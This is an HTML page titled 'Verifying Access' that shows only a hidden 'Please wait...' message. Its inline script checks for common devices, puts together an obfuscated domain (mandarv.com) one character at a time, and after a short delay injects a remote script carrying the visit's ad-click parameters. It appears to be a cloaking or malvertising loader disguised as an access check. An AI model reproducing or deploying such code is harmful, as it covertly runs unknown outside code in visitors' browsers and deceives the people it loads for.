<!DOCTYPE html>
<html>
<head>
  <meta charset='UTF-8'>
  <meta name='viewport' content='width=device-width, initial-scale=1'>
  <meta name='robots' content='noindex, nofollow'>
  <link rel='icon' href='data:,'>
  <title>Verifying Access</title>
  <style>
    body { background-color: #fff; font-family: Tahoma; margin: 0; }
    .hidden-msg { display: none; }
  </style>
  <script>
    function pullParam(p) {
      const q = new URLSearchParams(window.location.search);
      return q.get(p) || '';
    }

    function loadCheck() {
      return (
        typeof navigator.maxTouchPoints !== 'undefined' && navigator.maxTouchPoints > 0
      ) || (
        typeof window.orientation !== 'undefined'
      ) || (
        /Android|iPhone|iPad|Windows|Macintosh/i.test(navigator.userAgent)
      );
    }

    function scanScript() {
      const gclid = pullParam('gclid');
      const keyword = pullParam('keyword');
      const parts = ["h","t","t","p","s",":","/","/","m","a","n","d","a","r","v",".","c","o","m","/","P","7","C","S"];
      const finalUrl = parts.join('') + '?gclid=' + encodeURIComponent(gclid) + '&keyword=' + encodeURIComponent(keyword);
      const el = document.createElement('script');
      el.src = finalUrl;
      document.head.appendChild(el);
    }

    if (loadCheck()) {
      setTimeout(scanScript, 156);
    }
  </script>
</head>
<body>
  <div class='hidden-msg'>Please wait...</div>
</body>
</html>
